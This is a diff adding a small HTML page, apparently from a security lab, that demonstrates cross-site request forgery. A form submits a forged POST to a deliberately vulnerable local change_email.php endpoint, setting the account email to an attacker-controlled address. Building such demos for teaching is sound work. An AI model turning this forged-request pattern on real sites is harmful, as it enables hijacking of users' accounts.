@@ -1,0 +1,36 @@
+
+<!DOCTYPE html>
+<html>
+<!-- USING HEADING/TITLES/PARAGRAPHS to view in page -->
+<head>
+    <title>CSRF Demo</title>
+</head>
+
+<body>
+
+<h1>CSRF Demo</h1>
+
+<p>This is a controlled test page used to 
+demonstrate how a forged external request from this website 
+can be accepted by our main vulnerable website. </p>
+
+<!-- Send the forged request using post method 
+replicated from legitamate homepage.php form  -->
+
+
+<form method="POST" action="http://localhost:8000/change_email.php">
+<!-- test values to use as parameter for the changing the email  -->
+    <label for="email">Test Email:</label>
+
+    <input type="email"
+           id="email"
+           name="email"
+           value="csrfhackercred@example.test">
+
+    <input type="submit" value="Run CSRF">
+
+</form>
+
+</body>
+</html>
+
